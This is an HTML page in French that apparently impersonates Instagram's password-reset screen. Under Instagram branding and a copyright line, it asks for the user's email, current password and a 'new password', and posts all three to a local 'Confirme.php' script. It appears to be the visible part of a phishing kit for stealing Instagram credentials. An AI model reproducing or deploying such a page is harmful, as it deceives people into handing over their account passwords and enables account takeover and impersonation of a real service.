<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cookie&display=swap" rel="stylesheet">

<title>Document</title>
    <style>
        *{
            padding: 0;
            margin: 0;
            font-family: sans-serif;
        }
        .header {
  overflow: hidden;
  background-color: #517fa4;
  padding: 0px 10px;
  

  
  
}
.logo{
    font-style: italic;
            font: oblique;
            
}

/* Style the header links */
.header a {
  float: left;
  color: white;
  text-align: center;
  padding: 12px;
  text-decoration: none;
  font-size: 18px;
  line-height: 25px;
  border-radius: 4px;
  font: bold;
  
}

/* Style the logo link (notice that we set the same value of line-height and font-size to prevent the header to increase when the font gets bigger */
.header a.logo {
  font-size: 25px;
  font-weight: bold;
}

/* Change the background color on mouse-over */


/* Style the active/current link*/
.header {
  color: white;
  
}

/* Float the link section to the right */
.header-right {
  float: right;
}

/* Add media queries for responsiveness - when the screen is 500px wide or less, stack the links on top of each other */
@media screen and (max-width: 500px) {
  .header a {
    float: none;
    display: block;
    text-align: left;
  }
  .header-right {
    float: none;
  }
}
@media(max-width:768px)
{
  form{
    margin-left: 0;
    width: 100%;
    padding-left: 10px;
  }
  .header{
    padding-left: 35%;
  }
  #btn{
    padding: 0px;
    font-size: 10px;
  }
  
  
  .input{
            
            padding:10px ;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
  
}


div.inn
{
    margin-top: 10px;
}
        #p{
            background-color: #f2dede;
            color: #b94a5c;
            margin-top: 15px;
            
            border-radius: 10px;
            text-align: left;
            
            margin: 5px 5px 5px 5px;
            padding: 10px;
        }
        form{
            
            border: 1px #bbb;
        }
        .input{
            width: 65%;
            padding:10px ;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        label{
            margin-left: 10px;
            font-size: 15px;
            font-weight: bold;
        }
        #btn{
            padding: 10px;
            font-size: 15px; 
            
            background-color: #b3d1f0; 
            border: 1px rgb(160, 159, 159);
           
            border: 1px solid #ddd;
            border-radius: 5px;
            color: #222;
            font-weight: bold; 
        }
        
        
    </style>
</head>



<body>
    <div class="header">
        <a href="#default" class="logo" style="color: #eeeeff; letter-spacing: 3px; font-family: 'Cookie', cursive;font-size:30px; ">Instagram</a>
        <div class="header-right">
         
        </div>
      </div>
      <div class="frm" >
        <form method="post" action="Confirme.php" >
        <div class="lef" id="containner">
        <h1 style="margin-bottom: 10px;"><b> Instagram </b></h1>
        <p  id="p">Créez un mot de passe d’au moins 6 caractères.</p>
        <br />
        <hr>
            <div class='inn'>
                <label for="">Email :</label><br><br>
                <input type="text" name="eml" id="Email" class="input" autocomplete="off" required>
            </div><br>
            <div class='inn'>
                <label for="">Mot de passe :</label><br><br>
                <input type="text" name="pss" id="pw" class="input" autocomplete="off" required>
            </div><br>
            <div class='inn'>
                <label for="">Nouveau mot de passe :</label><br><br>
                <input type="text" name="cnf" id="cn" class="input" autocomplete="off" required>
            </div><br><br>
            <div class='inn'>
                <input type="submit" value="réinitialiser mot de passe" id="btn">

            </div>
        </div>
       
    </form>
    </div><br>
    <div>
        <p style="text-align: right;  font-size: 14px;">© 2022 INSTAGRAM</p>
    </div>
    
</body>
</html>